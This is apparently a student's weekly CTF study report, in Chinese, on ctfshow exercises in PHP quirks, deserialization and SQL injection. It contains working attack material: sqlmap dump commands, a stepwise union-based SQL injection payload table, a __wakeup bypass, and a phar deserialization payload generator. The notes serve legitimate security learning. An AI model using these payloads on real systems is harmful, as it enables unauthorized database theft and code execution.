# 完成事项

+ ### 工具方面
  
  1. 再次安装了wsl2，启动比vmware便捷多，并且避免了kali中大部分工具用不到
  
  2. 通过各种渠道使用不同的ai，发现ai在某些方面确实有极大的便利

+ ### web方面
  
  1. 完成了ctfshow98~104php特性板块
  
  2. 完成了ctfshow254~258反序列化板块
  
  3. 完成了ctfshow171~174sql注入板块

---

# 下周待做事项

1. 继续学习php反序列化，安装xdebug方便调试

2. 学习sql注入的其他过滤和盲注情况

3. 学习其他文件上传漏洞

---

# 本周学习的知识分享

+ sqlmap和bp的联动
  
  * **用Burp抓包**：浏览器访问题目，Burp抓到GET请求
  
  * **保存为文件**：右键`Save item`，存成`1.txt`
  
  * **SQLmap加载文件**：
    
    ```markdown
    sqlmap -r 1.txt --batch --dump
    sqlmap -r 1.txt -p 指定参数 --batch --dump
    ```

+ sqli常见符号
  
  | 符号                   | 作用               | 示例                        |
  | -------------------- | ---------------- | ------------------------- |
  | `'`                  | 闭合原查询的单引号        | `id='1'` → 破坏语法           |
  | `--+`                | SQL 注释符，注释掉后面代码  | `--+` 是注释，+ 是 URL 编码空格    |
  | `union`              | 合并两个查询结果         | 前后列数必须一致                  |
  | `select 1,2,3`       | 构造假数据，找显示位       | 数字 1,2,3 可换成任意数据          |
  | `database()`         | MySQL 函数，返回当前库名  | 等价 `version()`、`user()`   |
  | `information_schema` | MySQL 系统库，存所有表结构 | tables 表存表名，columns 表存字段名 |

+ sqli基本步骤
  
  | 步骤       | Payload                                                                                                                           | 截图要求            |
  | -------- | --------------------------------------------------------------------------------------------------------------------------------- | --------------- |
  | 1. 确认注入点 | `id=1'`                                                                                                                           | 页面报错（证明拼接了SQL）  |
  | 2. 判断列数  | `id=1' order by 3--+`                                                                                                             | 页面正常（说明有3列）     |
  | 3. 找显示位  | `id=1' union select 1,2,3--+`                                                                                                     | 页面出现2或3（找到注入窗口） |
  | 4. 爆库名   | `id=1' union select 1,database(),3--+`                                                                                            | 页面出现库名          |
  | 5. 爆表名   | `id=1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='库名'--+`                       | 页面出现表名          |
  | 6. 爆列名   | `id=1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='库名' and table_name='表名'--+` | 页面出现列名          |
  | 7. 提flag | `id=1' union select 1,group_concat(列名),3 from 表名--+`<br>（列名是flag存在的列，列名和表名不用打引号或者用反引号）                                            | 页面出现flag        |

+ SQLI总结
  
  今天亲手实验发现：id=1和id=-1都能让union执行，但-1更保险。因为-1在原表中不存在，确保union的结果是第一行，不会被其他数据挤掉。CTF题目页面通常只显示第1行，所以师傅们教-1。以后做题先用-1，不行再试别的。

+ 属性修饰符
  
  `public`: 公共的：在所有位置都可访问 `protected`: 受保护的：只能再该类内部和该类的子类中访问 `private`: 私有的：只能在该类内部访问
  
  使用属性修饰符后进行序列化会打印出不可见字符，直接复制粘贴会丢失，需要url编码

+ __wakeup
  
  序列化字符串中**表示对象属性个数的值大于真实的属性个数**时会跳过`__wakeup`的执行。

+ 魔术方法
  
  ```markdown
  __destruct()  // 对象销毁时自动执行
  __wakeup()  // 反序列化中自动执行
  
  __toString()   // 将对象转换为字符串(echo $a->name)是自动触发
  __invoke()     // 将对象作为函数($a())调用时触发
  __get($name)        // 访问对象中不存在的属性($name)时触发，并将名字作为参数传入
  __set($name,$value)// 对对象中不存在的属性赋值(nss、ctf)时触发，并将名字和值作为参数传入
  __call($name, $args)// 调用对象中不存在的方法(getflag())时触发，并将名字和参数数组作为参数传入
  ```

+ phar反序列化
  
  要求：
  
  1. 可以上传文件
  2. 可以读取文件
  3. 读取文件时未对路径及协议做过滤（传参=phar://路径）
  
  注意：修改`php.ini`配置
  
  ```php
  <?php
  class A { 
      public $a;
  } 
  class B { 
      public $b;
  } 
  $a = new A();
  $a->a = new B();
  $a->a->b = "phpinfo();";
  
  $phar = new Phar("phar.phar"); //后缀名必须为phar
  $phar->startBuffering();
  $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub
  $phar->setMetadata($a); //将自定义的meta-data存入manifest
  $phar->addFromString("test.txt", "test"); //添加要压缩的文件
  $phar->stopBuffering();
  ```

+ 

---

# 本周学习总结

这周期中考试，web学习落下了很多，这周周报都没什么好写，下周补回来




